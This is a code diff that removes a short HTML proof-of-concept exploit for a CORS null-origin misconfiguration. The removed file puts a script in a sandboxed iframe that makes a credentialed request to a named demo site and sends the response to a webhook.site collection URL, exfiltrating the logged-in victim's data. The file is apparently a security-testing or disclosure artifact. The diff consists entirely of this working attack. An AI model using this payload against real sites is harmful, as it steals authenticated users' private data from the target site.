@@ -1,18 +1,1 @@
-<html>
-  <body>
-    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
-      <script>
-        var xhr = new XMLHttpRequest();
-        var url = 'https://fieldsranch.uat.pga.legends.blcdemo.com/'
 
-        xhr.onreadystatechange = function() {
-          if(xhr.readyState == XMLHttpRequest.DONE) {
-            fetch('https://webhook.site/19b73ec9-e884-4363-9005-40d3dded3dc3' + xhr.responseText)
-            }
-          }
-        xhr.open('GET', url, true);
-        xhr.withCredentials = true;
-        xhr.send(null);
-      </script>"></iframe>
-  </body>
-</html>
